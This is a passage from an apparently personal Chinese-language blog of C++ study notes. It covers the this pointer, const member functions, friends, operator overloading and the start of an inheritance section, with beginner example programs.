href="#C-对象模型和this指针" class="headerlink" title="C++对象模型和this指针"></a>C++对象模型和this指针</h4><p>1.在C++中，类内的成员变量和成员函数分开存储，只有非静态成员变量才属于类的对象上，而且对于一个空类，其占一个字节。</p><p>2.this指针</p><p><strong>this指针指向被调用的成员函数所属的对象</strong></p><p>this指针的用途：</p><ul><li> 当形参和成员变量同名时，可用this指针来区分</li><li> 在类的非静态成员函数中返回对象本身，可使用return *this</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">Person(<span class="keyword">int</span> m_num)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//可以看到传入形参名称和属性名称一样，这时候需要用this指针来区别。</span></span><br><span class="line"><span class="keyword">this</span>-&gt;m_num = m_num;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回为Person类型，相当于用了拷贝函数产生了一个新对象</span></span><br><span class="line"><span class="function">Person <span class="title">add1</span><span class="params">(Person p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;m_num += p.m_num;</span><br><span class="line"><span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回为Person&amp;类型，就是原对象本身。</span></span><br><span class="line"><span class="function">Person&amp; <span class="title">add2</span><span class="params">(Person p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;m_num += p.m_num;</span><br><span class="line"><span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> m_num;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="function">Person <span class="title">p1</span><span class="params">(<span class="number">10</span>)</span></span>;</span><br><span class="line"><span class="comment">//链式结构</span></span><br><span class="line">p1.add1(p1).add1(p1).add1(p1).m_num;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; p1.m_num &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test02</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="function">Person <span class="title">p2</span><span class="params">(<span class="number">10</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">p2.add2(p2).add2(p2).add2(p2).m_num;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; p2.m_num &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">test01();</span><br><span class="line">test02();</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.空指针访问成员函数</p><p>Person *p=NULL;，这种空指针可以访问类中的成员函数，但是如果用到了this指针，就不可以了，因为这时候相当于this指针是空指针，没有指向任何一个对象。</p><p>4.const修饰成员函数，直接复制过来了</p><p><strong>常函数：</strong></p><ul><li>成员函数后加const后我们称为这个函数为<strong>常函数</strong></li><li>常函数内不可以修改成员属性</li><li>成员属性声明时加关键字mutable后，在常函数中依然可以修改</li></ul><p><strong>常对象：</strong></p><ul><li>声明对象前加const称该对象为常对象</li><li>常对象只能调用常函数</li></ul><p><strong>示例：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">Person() &#123;</span><br><span class="line">m_A = <span class="number">0</span>;</span><br><span class="line">m_B = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//this指针的本质是一个指针常量，指针的指向不可修改</span></span><br><span class="line"><span class="comment">//如果想让指针指向的值也不可以修改，需要声明常函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShowPerson</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line"><span class="comment">//const Type* const pointer;</span></span><br><span class="line"><span class="comment">//this = NULL; //不能修改指针的指向 Person* const this;</span></span><br><span class="line"><span class="comment">//this-&gt;mA = 100; //但是this指针指向的对象的数据是可以修改的</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//const修饰成员函数，表示指针指向的内存空间的数据不能修改，除了mutable修饰的变量</span></span><br><span class="line"><span class="keyword">this</span>-&gt;m_B = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MyFunc</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line"><span class="comment">//mA = 10000;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">int</span> m_A;</span><br><span class="line"><span class="keyword">mutable</span> <span class="keyword">int</span> m_B; <span class="comment">//可修改 可变的</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//const修饰对象  常对象</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test01</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Person person; <span class="comment">//常量对象  </span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; person.m_A &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">//person.mA = 100; //常对象不能修改成员变量的值,但是可以访问</span></span><br><span class="line">person.m_B = <span class="number">100</span>; <span class="comment">//但是常对象可以修改mutable修饰成员变量</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//常对象访问成员函数</span></span><br><span class="line">person.MyFunc(); <span class="comment">//常对象只能调用const的函数</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="友元"><a href="#友元" class="headerlink" title="友元"></a>友元</h4><p>1.全局函数做友元</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">house</span> &#123;</span></span><br><span class="line"><span class="function"><span class="keyword">friend</span> <span class="keyword">void</span> <span class="title">gay</span><span class="params">(house* tmp)</span></span>;<span class="comment">//加上这个就可以用全局函数访问类中私有属性了。</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">house()</span><br><span class="line">&#123;</span><br><span class="line">m_SittingRoom = <span class="string">&quot;客厅&quot;</span>;</span><br><span class="line">m_BedRoom = <span class="string">&quot;卧室&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">string</span> m_SittingRoom;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="built_in">string</span> m_BedRoom;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gay</span><span class="params">(house* tmp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; tmp-&gt;m_SittingRoom &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; tmp-&gt;m_BedRoom &lt;&lt; <span class="built_in">endl</span>;<span class="comment">//加上就可访问。</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">house h;</span><br><span class="line">gay(&amp;h);</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.类做友元</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Building</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="comment">//告诉编译器 goodGay类是Building类的好朋友，可以访问到Building类中私有内容</span></span><br><span class="line"><span class="keyword">friend</span> <span class="class"><span class="keyword">class</span> <span class="title">goodGay</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">Building()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;m_SittingRoom = <span class="string">&quot;客厅&quot;</span>;</span><br><span class="line"><span class="keyword">this</span>-&gt;m_BedRoom = <span class="string">&quot;卧室&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">string</span> m_SittingRoom; <span class="comment">//客厅</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="built_in">string</span> m_BedRoom;<span class="comment">//卧室</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">goodGay</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">goodGay()</span><br><span class="line">&#123;</span><br><span class="line">building = <span class="keyword">new</span> Building;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">visit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;好基友正在访问&quot;</span> &lt;&lt; building-&gt;m_SittingRoom &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;好基友正在访问&quot;</span> &lt;&lt; building-&gt;m_BedRoom &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">Building* building;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">goodGay gg;</span><br><span class="line">gg.visit();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.成员函数做友元</p><p>这个里面有个点没搞懂，可以看下面代码中的成员函数是在类外写的，如果改为在类中写，程序会报错。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Building</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">goodGay</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">goodGay();</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">visit</span><span class="params">()</span></span>; <span class="comment">//只让visit函数作为Building的好朋友，可以发访问Building中私有内容</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">visit2</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">Building* building;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Building</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="comment">//告诉编译器  goodGay类中的visit成员函数 是Building好朋友，可以访问私有内容</span></span><br><span class="line"><span class="function"><span class="keyword">friend</span> <span class="keyword">void</span> <span class="title">goodGay::visit</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">Building();</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">string</span> m_SittingRoom; <span class="comment">//客厅</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="built_in">string</span> m_BedRoom;<span class="comment">//卧室</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Building::Building()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;m_SittingRoom = <span class="string">&quot;客厅&quot;</span>;</span><br><span class="line"><span class="keyword">this</span>-&gt;m_BedRoom = <span class="string">&quot;卧室&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">goodGay::goodGay()</span><br><span class="line">&#123;</span><br><span class="line">building = <span class="keyword">new</span> Building;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">goodGay::visit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;好基友正在访问&quot;</span> &lt;&lt; building-&gt;m_SittingRoom &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;好基友正在访问&quot;</span> &lt;&lt; building-&gt;m_BedRoom &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">goodGay::visit2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;好基友正在访问&quot;</span> &lt;&lt; building-&gt;m_SittingRoom &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">//cout &lt;&lt; &quot;好基友正在访问&quot; &lt;&lt; building-&gt;m_BedRoom &lt;&lt; endl;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">goodGay  gg;</span><br><span class="line">gg.visit();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="运算符重载"><a href="#运算符重载" class="headerlink" title="运算符重载"></a>运算符重载</h4><p>1.加号运算符重载，可以用成员函数实现，也可以用全局函数实现。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">Person(<span class="keyword">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">m_num = a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Person <span class="keyword">operator</span>+(Person &amp;p)</span><br><span class="line">&#123;</span><br><span class="line"><span class="function">Person <span class="title">temp</span><span class="params">(<span class="number">0</span>)</span></span>;</span><br><span class="line">temp.m_num = <span class="keyword">this</span>-&gt;m_num + p.m_num;</span><br><span class="line"><span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> m_num;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="function">Person <span class="title">p1</span><span class="params">(<span class="number">1</span>)</span></span>;</span><br><span class="line"><span class="function">Person <span class="title">p2</span><span class="params">(<span class="number">1</span>)</span></span>;</span><br><span class="line"><span class="comment">//Person p3 = p1.operator+(p2);和下面表达的意思是一样的。</span></span><br><span class="line">Person p3 = p1 + p2;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; p3.m_num &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test02</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.左移运算符重载和递增运算符重载</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">Person()&#123;</span><br><span class="line">m_num = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Person&amp; <span class="keyword">operator</span>++()</span><br><span class="line">&#123;</span><br><span class="line">m_num++;</span><br><span class="line"><span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Person <span class="keyword">operator</span>++(<span class="keyword">int</span>)</span><br><span class="line">&#123;</span><br><span class="line">Person tmp=*<span class="keyword">this</span>;</span><br><span class="line">m_num++;</span><br><span class="line"><span class="keyword">return</span> tmp;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> m_num;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">////注意这里的Person没用使用引用，因为上面的Person operator++(int),tmp的类型是Person。</span></span><br><span class="line">ostream&amp; <span class="keyword">operator</span>&lt;&lt;(ostream&amp; <span class="built_in">cout</span>, Person p)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; p.m_num;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">cout</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Person p1;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; ++p1 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; p1 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test02</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Person p2;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; p2++ &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; p2 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">test01();</span><br><span class="line">test02();</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h4><p>继承是面向对象三大特性之一，下级的成员有上级的共性，且有自己的特性，就可以用继承来减少代码。</p><p>1.基本语法</p><p>先用不继承的方式来展示代码</p><figure class="highlight c++"><table><tr><td 